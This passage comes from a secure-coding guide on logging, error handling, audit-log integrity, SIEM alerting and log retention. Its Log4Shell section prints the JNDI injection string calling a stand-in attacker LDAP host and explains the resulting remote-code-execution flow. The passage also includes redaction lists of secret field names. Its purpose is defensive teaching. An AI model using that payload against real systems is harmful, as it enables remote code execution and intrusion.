  const requestId = randomUUID();
  const correlationId = req.headers["x-correlation-id"] as string || randomUUID();

  // Set on response for client correlation
  res.setHeader("X-Request-ID", requestId);
  res.setHeader("X-Correlation-ID", correlationId);

  // Available throughout the request lifecycle
  requestContext.run({ requestId, correlationId }, () => {
    next();
  });
}

// Logger automatically includes correlation context
function getContextualLogger() {
  const ctx = requestContext.getStore();
  return logger.child({
    requestId: ctx?.requestId,
    correlationId: ctx?.correlationId,
  });
}
```

```go
// SECURE: Correlation ID in Go via context

func correlationMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        requestID := uuid.NewString()
        correlationID := r.Header.Get("X-Correlation-ID")
        if correlationID == "" {
            correlationID = uuid.NewString()
        }

        w.Header().Set("X-Request-ID", requestID)
        w.Header().Set("X-Correlation-ID", correlationID)

        ctx := context.WithValue(r.Context(), ctxKeyRequestID, requestID)
        ctx = context.WithValue(ctx, ctxKeyCorrelationID, correlationID)

        next.ServeHTTP(w, r.WithContext(ctx))
    })
}

// Contextual logger extracts IDs automatically
func LoggerFromContext(ctx context.Context) *slog.Logger {
    requestID, _ := ctx.Value(ctxKeyRequestID).(string)
    correlationID, _ := ctx.Value(ctxKeyCorrelationID).(string)

    return slog.Default().With(
        "request_id", requestID,
        "correlation_id", correlationID,
    )
}
```

### Log Levels for Security Events

```
Level       Use For Security Events
------      -------------------------------------------
DEBUG       Detailed auth flow tracing (dev/staging only)
INFO        Successful authentication, routine access grants
WARN        Failed login, access denied, validation failure, rate limit hit
ERROR       Authorization service failure, unexpected exception in security code
CRITICAL    Account takeover detected, breach indicator, integrity violation

Rule: Security events are NEVER logged at DEBUG in production.
Rule: Failed authentication is WARN, not ERROR (it is expected behavior).
Rule: Security control failures (auth service down) are ERROR.
Rule: Active attack indicators (mass account probing) are CRITICAL.
```

---

## Log4Shell Lessons (CVE-2021-44228)

### What Happened

In December 2021, a critical vulnerability was discovered in Apache Log4j 2 (versions 2.0-beta9 through 2.14.1), a ubiquitous Java logging library. The vulnerability allowed Remote Code Execution (RCE) through JNDI (Java Naming and Directory Interface) lookup injection.

```
Attack flow:

  1. Attacker sends HTTP request with malicious header:
     User-Agent: ${jndi:ldap://attacker.com/exploit}

  2. Application logs the User-Agent using Log4j:
     logger.info("Request from user-agent: " + userAgent);

  3. Log4j's message lookup feature evaluates the ${jndi:...} expression

  4. Log4j connects to attacker's LDAP server

  5. LDAP server returns a reference to a malicious Java class

  6. Log4j downloads and executes the attacker's code

  Result: Full remote code execution from a single logged string.
```

### Why It Mattered

- Log4j is embedded in hundreds of thousands of Java applications, directly and transitively.
- The vulnerability existed in a logging library -- a component developers trust implicitly.
- Any user input that was logged became an attack vector: HTTP headers, form fields, search queries, usernames.
- CVSS score: 10.0 (maximum severity).

### How to Prevent Similar Issues

```
Lesson 1: Logging libraries must NEVER evaluate expressions in logged data.
  - Log data is data, not code. A logger must serialize input, never interpret it.
  - Use logging libraries that treat all input as opaque strings.

Lesson 2: Disable unnecessary features in logging libraries.
  - Log4j's JNDI lookup was enabled by default and rarely needed.
  - Audit your logging library's feature set. Disable lookups, formatters,
    and plugins that process logged data as anything other than plain strings.

Lesson 3: Maintain a Software Bill of Materials (SBOM).
  - Know every direct and transitive dependency in your application.
  - When a vulnerability is announced, you must be able to determine within
    minutes whether you are affected.

Lesson 4: Defense in depth applies to logging.
  - Restrict outbound network access from application servers.
  - Even if a logger is tricked into making a JNDI call, a firewall
    blocking outbound LDAP (port 389/636) prevents exploitation.

Lesson 5: Pin dependency versions and audit regularly.
  - Use lockfiles (package-lock.json, go.sum, poetry.lock).
  - Run dependency vulnerability scans in CI (npm audit, snyk, trivy).
```

**Java -- secure Log4j configuration:**

```xml
<!-- log4j2.xml -- SECURE: Disable message lookups entirely -->
<Configuration status="ERROR">
  <Properties>
    <!-- Disable the feature that caused Log4Shell -->
    <Property name="log4j2.formatMsgNoLookups">true</Property>
  </Properties>

  <Appenders>
    <Console name="Console" target="SYSTEM_OUT">
      <!-- Use JSON layout -- structured, no lookups in patterns -->
      <JsonLayout compact="true" eventEol="true"
                  properties="true" stacktraceAsString="true">
        <!-- Do not include thread context map lookups -->
        <KeyValuePair key="service" value="my-service"/>
      </JsonLayout>
    </Console>
  </Appenders>

  <Loggers>
    <Root level="INFO">
      <AppenderRef ref="Console"/>
    </Root>
  </Loggers>
</Configuration>
```

```java
// Alternatively, set the system property programmatically or via JVM args:
// -Dlog4j2.formatMsgNoLookups=true

// BEST: Upgrade to Log4j 2.17.1+ which removed the vulnerable code entirely.
// And prefer SLF4J with Logback or java.util.logging for new projects.
```

---

## Audit Logging

Audit logs serve a different purpose than application logs. They are the legal and compliance record of who did what, when, and to what resource. They must be tamper-evident, append-only, and independently verifiable.

### Tamper-Evident Log Chain

```typescript
// SECURE: Append-only audit log with hash chain for tamper detection

import crypto from "crypto";

interface AuditEntry {
  sequenceNumber: number;
  timestamp: string;
  eventId: string;
  actor: { userId: string; ip: string; sessionId: string };
  action: string;
  resource: { type: string; id: string };
  outcome: "success" | "failure" | "denied";
  details: Record<string, unknown>;
  previousHash: string;
  entryHash: string;
}

class TamperEvidentAuditLog {
  private sequenceNumber = 0;
  private lastHash = "genesis_000000000000";

  async append(entry: Omit<AuditEntry, "sequenceNumber" | "timestamp" | "eventId" | "previousHash" | "entryHash">): Promise<AuditEntry> {
    this.sequenceNumber++;

    const auditEntry: AuditEntry = {
      ...entry,
      sequenceNumber: this.sequenceNumber,
      timestamp: new Date().toISOString(),
      eventId: crypto.randomUUID(),
      previousHash: this.lastHash,
      entryHash: "",
    };

    // Compute hash over all fields except entryHash
    const { entryHash: _, ...hashInput } = auditEntry;
    auditEntry.entryHash = crypto
      .createHash("sha256")
      .update(JSON.stringify(hashInput))
      .digest("hex");

    this.lastHash = auditEntry.entryHash;

    // Write to append-only storage
    await this.storage.append(auditEntry);

    // Replicate to external SIEM for independent verification
    await this.siemClient.send(auditEntry);

    return auditEntry;
  }

  async verifyIntegrity(): Promise<{ valid: boolean; brokenAt?: number }> {
    const entries = await this.storage.readAll();
    let expectedPreviousHash = "genesis_000000000000";

    for (const entry of entries) {
      // Verify chain linkage
      if (entry.previousHash !== expectedPreviousHash) {
        return { valid: false, brokenAt: entry.sequenceNumber };
      }

      // Verify entry hash
      const { entryHash: storedHash, ...hashInput } = entry;
      const computedHash = crypto
        .createHash("sha256")
        .update(JSON.stringify(hashInput))
        .digest("hex");

      if (computedHash !== storedHash) {
        return { valid: false, brokenAt: entry.sequenceNumber };
      }

      expectedPreviousHash = storedHash;
    }

    return { valid: true };
  }
}
```

### Compliance Requirements

```
Standard       Audit Logging Requirements
--------       -----------------------------------------
PCI-DSS 10     - Log all access to cardholder data
               - Log all actions by privileged users
               - Log all authentication attempts
               - Retain logs for at least 1 year (3 months immediately available)
               - Synchronize clocks via NTP
               - Protect logs from unauthorized modification

SOC2 CC7.2    - Monitor system components for anomalies
               - Log security-relevant events
               - Retain sufficient history for investigation
               - Implement alerting on suspicious patterns

HIPAA          - Log all access to Protected Health Information (PHI)
               - Record user identity, date, time, action
               - Retain audit logs for 6 years
               - Implement access controls on log data itself

GDPR           - Log processing activities involving personal data
               - Demonstrate accountability through records
               - Implement data protection impact assessments
               - Log data subject access requests and responses

SOX            - Log all changes to financial reporting systems
               - Maintain evidence of internal controls
               - Retain audit trails per record retention schedules
```

### Append-Only Storage Options

```
Storage Type             Characteristics                    Use Case
-----------              ---------------                    --------
AWS CloudWatch Logs      Managed, append-only by default    Cloud-native applications
AWS S3 + Object Lock     WORM storage, immutable            Long-term compliance archive
Azure Immutable Blob     Time-based or legal hold           Azure compliance workloads
GCP Cloud Logging        Managed, export to locked storage  GCP applications
PostgreSQL + RLS         Row-level security, no DELETE      Self-hosted audit tables
Append-only file + HMAC  Simple, verifiable, air-gappable   Air-gapped environments

Critical: The application database user must NOT have DELETE or UPDATE
permissions on the audit log table. Use a separate database role for
audit writes that can only INSERT.
```

```sql
-- SECURE: Audit table with no UPDATE/DELETE capability for the application

CREATE TABLE audit_log (
    id BIGSERIAL PRIMARY KEY,
    sequence_number BIGINT NOT NULL,
    timestamp TIMESTAMPTZ NOT NULL DEFAULT now(),
    event_id UUID NOT NULL DEFAULT gen_random_uuid(),
    actor_user_id TEXT NOT NULL,
    actor_ip INET NOT NULL,
    action TEXT NOT NULL,
    resource_type TEXT NOT NULL,
    resource_id TEXT NOT NULL,
    outcome TEXT NOT NULL CHECK (outcome IN ('success', 'failure', 'denied')),
    details JSONB,
    previous_hash TEXT NOT NULL,
    entry_hash TEXT NOT NULL
);

-- Application role: INSERT only, no UPDATE, no DELETE, no TRUNCATE
CREATE ROLE audit_writer;
GRANT INSERT ON audit_log TO audit_writer;
GRANT USAGE ON SEQUENCE audit_log_id_seq TO audit_writer;
-- No UPDATE, DELETE, or TRUNCATE granted

-- Separate read-only role for auditors
CREATE ROLE audit_reader;
GRANT SELECT ON audit_log TO audit_reader;

-- Prevent even the table owner from casual deletes via trigger
CREATE OR REPLACE FUNCTION prevent_audit_modification()
RETURNS TRIGGER AS $$
BEGIN
    RAISE EXCEPTION 'Audit log entries cannot be modified or deleted';
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER no_update_audit
    BEFORE UPDATE OR DELETE ON audit_log
    FOR EACH ROW EXECUTE FUNCTION prevent_audit_modification();
```

---

## Centralized Logging

### Architecture

Centralize all logs from all services into a single, searchable, alertable platform. This enables cross-service correlation, security monitoring, and incident investigation.

```
Centralized Logging Architecture:

  ┌────────────┐    ┌────────────┐    ┌────────────┐
  │ Service A  │    │ Service B  │    │ Service C  │
  │ (JSON logs)│    │ (JSON logs)│    │ (JSON logs)│
  └─────┬──────┘    └─────┬──────┘    └─────┬──────┘
        │                 │                 │
        └────────┬────────┴────────┬────────┘
                 │                 │
         ┌───────▼───────┐ ┌──────▼──────────┐
         │ Log Shipper   │ │ Log Shipper     │
         │ (Fluentd /    │ │ (Filebeat /     │
         │  Vector)      │ │  Fluent Bit)    │
         └───────┬───────┘ └──────┬──────────┘
                 │                │
                 └───────┬────────┘
                         │
              ┌──────────▼──────────┐
              │  Log Aggregator     │
              │  (Elasticsearch /   │
              │   Datadog / Splunk /│
              │   CloudWatch)       │
              └──────────┬──────────┘
                         │
              ┌──────────▼──────────┐
              │  SIEM Integration   │
              │  - Alert rules      │
              │  - Dashboards       │
              │  - Anomaly detection│
              │  - Incident response│
              └─────────────────────┘
```

### Security-Specific Alerting Rules

Configure alerts for patterns that indicate active attacks or security incidents:

```yaml
# Example: Splunk/SIEM alerting rules for security events

alerts:
  - name: "Brute Force Detection"
    query: >
      event_type="authentication" AND outcome="failure"
      | stats count by actor.ip
      | where count > 10
    window: "5m"
    severity: "high"
    action: "notify_security_team"

  - name: "Privilege Escalation Attempt"
    query: >
      event_type="authorization" AND action="role_change"
      AND details.new_role IN ("admin", "superadmin")
    window: "1h"
    severity: "critical"
    action: "notify_security_team, create_incident"

  - name: "Bulk Data Export"
    query: >
      event_type="data_access" AND action="export"
      AND details.record_count > 1000
    window: "1h"
    severity: "medium"
    action: "notify_security_team"

  - name: "Off-Hours Admin Access"
    query: >
      event_type="authentication" AND outcome="success"
      AND actor.role="admin"
      AND (hour < 6 OR hour > 22)
    window: "1h"
    severity: "medium"
    action: "notify_security_team"

  - name: "Multiple Countries Same User"
    query: >
      event_type="authentication" AND outcome="success"
      | stats dc(actor.geo) as country_count by actor.user_id
      | where country_count > 1
    window: "1h"
    severity: "high"
    action: "notify_security_team, force_reauth"

  - name: "Authorization Service Failure"
    query: >
      event_type="authorization" AND outcome="error"
      | stats count
      | where count > 5
    window: "5m"
    severity: "critical"
    action: "page_oncall, create_incident"
```

### ELK Stack Security Configuration

```yaml
# filebeat.yml -- SECURE: Ship logs with TLS and authentication

filebeat.inputs:
  - type: log
    enabled: true
    paths:
      - /var/log/app/*.json
    json.keys_under_root: true
    json.add_error_key: true
    # Drop lines containing potential PII that slipped through
    exclude_lines: ['password', 'secret', 'token']

output.elasticsearch:
  hosts: ["https://elasticsearch.internal:9200"]
  protocol: "https"
  ssl.certificate_authorities: ["/etc/pki/ca.pem"]
  ssl.certificate: "/etc/pki/client.crt"
  ssl.key: "/etc/pki/client.key"
  username: "${ELASTIC_USER}"
  password: "${ELASTIC_PASSWORD}"

# Encrypt log data in transit
# Authenticate the shipper to the log aggregator
# Do not ship raw credentials or tokens
```

---

## Log Retention and Access Control

### Retention Policies

```
Data Classification     Retention Period    Storage Tier         Notes
-------------------     ----------------    ------------         -----
Security audit logs     7 years             Cold/archive         PCI-DSS, SOX requirement
Authentication logs     1 year              Warm (3 months hot)  PCI-DSS Req 10.7
Application logs        90 days             Hot (30 days)        Operational troubleshooting
Debug logs              7 days              Hot                  Dev/staging only, never in prod
Access logs (HTTP)      1 year              Warm                 Incident investigation
Infrastructure logs     90 days             Warm                 Capacity planning, debugging

Rule: Define retention before deployment. Automate deletion.
Rule: Legal hold overrides standard retention -- do not delete logs
      under legal hold regardless of retention policy.
```

### Encrypted Log Storage

```typescript
// SECURE: Encrypt logs at rest using envelope encryption

import { KMSClient, GenerateDataKeyCommand, DecryptCommand } from "@aws-sdk/client-kms";
import crypto from "crypto";

class EncryptedLogWriter {
  private kms: KMSClient;
  private keyId: string;

  constructor(kmsKeyId: string) {
    this.kms = new KMSClient({});
    this.keyId = kmsKeyId;
  }

  async writeEncryptedLog(logEntry: Record<string, unknown>): Promise<void> {
    // Generate a data key from KMS (envelope encryption)
    const { Plaintext: dataKey, CiphertextBlob: encryptedDataKey } =
      await this.kms.send(new GenerateDataKeyCommand({
        KeyId: this.keyId,
        KeySpec: "AES_256",
      }));

    // Encrypt the log entry with the data key
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv("aes-256-gcm", dataKey!, iv);
    const plaintext = JSON.stringify(logEntry);
    const encrypted = Buffer.concat([
      cipher.update(plaintext, "utf8"),
      cipher.final(),
    ]);
    const authTag = cipher.getAuthTag();

    // Store: encrypted data key + IV + auth tag + ciphertext
    // The data key is encrypted by KMS -- only KMS can decrypt it
    await this.storage.write({
      encryptedDataKey: encryptedDataKey!,
      iv: iv,
      authTag: authTag,
      ciphertext: encrypted,
    });

    // Zero the plaintext data key from memory
    dataKey!.fill(0);
  }
}
```

### Access Control on Logs

```
Principle: Logs are a sensitive data store. Apply the same access controls
to logs that you apply to the data they describe.

Role                Access Level                    Justification
----                ------------                    -------------
Application         Write (append) only             Services generate logs, never read them
SRE / Operations    Read (filtered, time-bound)     Troubleshooting production issues
Security Team       Read (full, all services)       Incident investigation, threat hunting
Auditors            Read (audit logs only)           Compliance verification
Developers          Read (non-prod only)             Debugging in staging/dev
Management          No direct access                 Receive dashboards and reports

Rule: No single person should have both WRITE and DELETE access to logs.
Rule: Log access itself must be logged (who queried what logs, when).
Rule: Production logs must not be accessible from developer workstations
      without going through a controlled access portal with audit trail.
```

```yaml
# AWS IAM policy -- SECURE: Read-only access to specific log group

{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "ReadAppLogs",
      "Effect": "Allow",
      "Action": [
        "logs:GetLogEvents",
        "logs:FilterLogEvents",
        "logs:DescribeLogStreams"
      ],
      "Resource": "arn:aws:logs:us-east-1:123456789:log-group:/app/production:*"
    },
    {
      "Sid": "DenyLogDeletion",
      "Effect": "Deny",
      "Action": [
        "logs:DeleteLogGroup",
        "logs:DeleteLogStream",
        "logs:PutRetentionPolicy"
      ],
      "Resource": "*"
    }
  ]
}
```

---

## Best Practices

1. **ALWAYS return generic error messages to external consumers.** Internal details -- stack traces, SQL errors, file paths, library versions -- must appear only in server-side logs, never in HTTP responses. Include a request ID in the external response for correlation.

2. **ALWAYS use structured logging (JSON format).** Structured logging prevents log injection (CWE-117) by design, enables automated parsing, and supports SIEM integration. Never concatenate user input into log message strings.

3. **ALWAYS default to DENY when a security check fails.** If an authorization service is unreachable, times out, or throws an exception, the result must be access denied. Never return `true` from a permission check's catch block.

4. **ALWAYS mask PII before logging.** Emails, credit card numbers, phone numbers, SSNs, and IP addresses must be masked or truncated at the point of logging. Use framework-level redaction (pino `redact`, structlog processors) to enforce this automatically.

5. **ALWAYS log security events with consistent structure.** Every security log entry must include: timestamp, event type, actor (user ID, IP, session), action, resource, outcome, and correlation ID. Use a documented schema across all services.

6. **ALWAYS replace default framework error pages.** Express, Django, Spring Boot, ASP.NET, and Go default error handlers leak technology stack information. Configure custom error handlers for all HTTP status codes (400, 403, 404, 500) before deploying to production.

7. **ALWAYS use typed error hierarchies.** Distinguish between operational errors (expected, safe to describe to users) and programming errors (unexpected, must be hidden). Route all errors through a global error handler that enforces this distinction.

8. **ALWAYS implement tamper-evident audit logging for sensitive operations.** Use hash chains, append-only storage, and external replication. The application must not have DELETE or UPDATE permissions on audit log tables.

9. **ALWAYS maintain correlation IDs across service boundaries.** Generate a request ID at the edge, propagate it through all downstream calls, and include it in every log entry and error response. This enables end-to-end tracing during incident investigation.

10. **ALWAYS audit your logging library's feature set and disable unnecessary capabilities.** Log4Shell (CVE-2021-44228) exploited a lookup feature that most applications never needed. Review what your logger evaluates, interpolates, or executes, and disable everything that treats logged data as anything other than inert strings.

---

## Anti-Patterns

### 1. Stack Traces in Production Responses

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Error responses include `err.stack`, `traceback`, or framework debug pages | Attacker learns framework version, file paths, class names, database driver, OS details | Global error handler strips all internal details. Return generic message plus request ID only. Disable `DEBUG=True`, `server.error.include-stacktrace` in production |

### 2. Differentiated Login Failure Messages

| Problem | Consequence | Fix |
|---------|-------------|-----|
| "User not found" vs "Incorrect password" as separate error messages | Attacker enumerates valid email addresses / usernames by observing which error appears | Return the same message for all authentication failures: "Invalid email or password." Log the specific reason server-side only |

### 3. Fail-Open on Authorization Errors

| Problem | Consequence | Fix |
|---------|-------------|-----|
| `catch (error) { return true; }` in permission check code | Authorization service outage grants access to everyone | Default to `return false` in all catch blocks of permission checks. Alert on authorization service failures |

### 4. String Concatenation in Log Messages

| Problem | Consequence | Fix |
|---------|-------------|-----|
| `logger.info("User logged in: " + username)` with unsanitized user input | Log injection (CWE-117): attacker forges log entries, corrupts SIEM analysis, hides attack traces | Use structured logging: `logger.info({ username }, "User logged in")`. JSON serialization escapes control characters |

### 5. Logging Passwords, Tokens, and Secrets

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Request body logged verbatim including password fields, API keys, session tokens | Log file compromise exposes credentials. Violates PCI-DSS Requirement 3.4. Stored in plaintext across log pipeline | Configure field-level redaction in the logging library. Maintain a deny-list of fields: password, token, secret, authorization, cookie, apiKey, creditCard, ssn |

### 6. No Centralized Error Handler

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Every route has its own try-catch with individually crafted error responses | Inconsistent error formats, some routes leak details, some swallow errors silently, impossible to enforce policy | Implement a single global error handler middleware. Routes throw typed errors. The handler maps error types to safe responses |

### 7. Logs Without Correlation IDs

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Log entries from different services cannot be correlated to a single request | Security incidents spanning multiple services cannot be reconstructed. Forensic investigation is crippled | Generate a request ID at the edge gateway. Propagate it via `X-Request-ID` / `X-Correlation-ID` headers. Include it in every log entry |

### 8. Mutable Audit Logs

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Audit log table is writable (UPDATE, DELETE) by the same database user that inserts entries | Attacker or insider who compromises the application can delete evidence of their actions | Separate database role for audit writes (INSERT only). Trigger to prevent UPDATE/DELETE. Replicate to external SIEM. Use append-only or WORM storage |

---

## Enforcement Checklist

### Secure Error Handling
- [ ] Global error handler is configured for all unhandled exceptions
- [ ] Custom error pages replace framework defaults for 400, 403, 404, 500
- [ ] No stack traces, SQL errors, file paths, or server versions in HTTP responses
- [ ] Login endpoints return the same error message for all failure modes
- [ ] Every error response includes a request ID for correlation
- [ ] `DEBUG` / `dev mode` is verified OFF in production configuration
- [ ] `X-Powered-By` and `Server` headers are removed or generic

### Fail-Secure Design
- [ ] All authorization check catch blocks return `false` / deny
- [ ] Timeouts are configured on all external authorization calls
- [ ] Authorization service failures trigger alerts (not silent bypass)
- [ ] Feature flags default to OFF / disabled
- [ ] Network firewall rules default to DENY

### Typed Error Architecture
- [ ] Error hierarchy separates operational errors from programming errors
- [ ] Operational errors have safe, user-facing messages
- [ ] Programming errors are logged in full but return generic responses externally
- [ ] React/frontend uses error boundaries that do not render internal details

### Log Injection Prevention
- [ ] All logging uses structured format (JSON) -- no string concatenation of user input
- [ ] Logging library's lookup / evaluation features are disabled (Log4j `formatMsgNoLookups=true`)
- [ ] Control characters in log input are escaped or stripped
- [ ] Log message templates never evaluate user-supplied data as expressions

### PII Protection in Logs
- [ ] Passwords, tokens, API keys, and session cookies are never logged
- [ ] Email addresses are masked (`j***@example.com`)
- [ ] Credit card numbers show last 4 digits only (`****1234`)
- [ ] IP addresses are anonymized where not required for security
- [ ] Logging framework's redact/censor feature is configured for known PII fields
- [ ] Automated PII scanning runs on log output in CI/CD pipeline

### Security Event Logging
- [ ] Authentication events logged: login, logout, failure, lockout, MFA, password change
- [ ] Authorization failures logged with actor, resource, and action
- [ ] Input validation failures logged (suspected injection, malformed input)
- [ ] Administrative actions logged with before/after state
- [ ] Data access to sensitive records is logged
- [ ] Configuration changes are logged

### Structured Logging Schema
- [ ] All services use a consistent JSON log schema
- [ ] Every log entry includes: timestamp, level, service name, request ID, correlation ID
- [ ] Security events include: event_type, actor, action, resource, outcome
- [ ] Log levels follow defined policy (WARN for auth failures, ERROR for service failures, CRITICAL for breach indicators)

### Audit Log Integrity
- [ ] Audit logs use hash chain or similar tamper-detection mechanism
- [ ] Application database role has INSERT-only permission on audit tables
- [ ] UPDATE and DELETE on audit tables are blocked by trigger or storage-level enforcement
- [ ] Audit logs are replicated to external storage (SIEM, S3 with Object Lock)
- [ ] Audit log integrity is verified on a schedule (daily or weekly)

### Centralized Logging and Alerting
- [ ] All services ship logs to a centralized platform (ELK, Datadog, Splunk, CloudWatch)
- [ ] Log transport uses TLS encryption and mutual authentication
- [ ] SIEM alerting rules are configured for: brute force, privilege escalation, bulk export, off-hours access, geo-anomaly
- [ ] Alert rules are tested and verified at least quarterly
- [ ] Dashboards exist for security event trends

### Log Retention and Access Control
- [ ] Retention policies are defined per log classification (audit: 7 years, app: 90 days)
- [ ] Automated deletion enforces retention -- no manual purging
- [ ] Legal hold process exists and can override retention
- [ ] Log access is role-based: operations (read filtered), security (read all), developers (non-prod only)
- [ ] Log access is itself logged (who queried what, when)
- [ ] Logs are encrypted at rest (KMS, envelope encryption, or disk-level encryption)
- [ ] No single person has both write and delete access to any log store

### Dependency Security for Logging Libraries
- [ ] Logging library versions are pinned in lockfiles
- [ ] Dependency vulnerability scans run in CI (npm audit, snyk, trivy, govulncheck)
- [ ] SBOM is maintained and can be queried for affected components within minutes
- [ ] Unnecessary logging library features (lookups, JNDI, expression evaluation) are explicitly disabled
- [ ] Outbound network access from application servers is restricted by firewall (defense in depth against Log4Shell-class attacks)
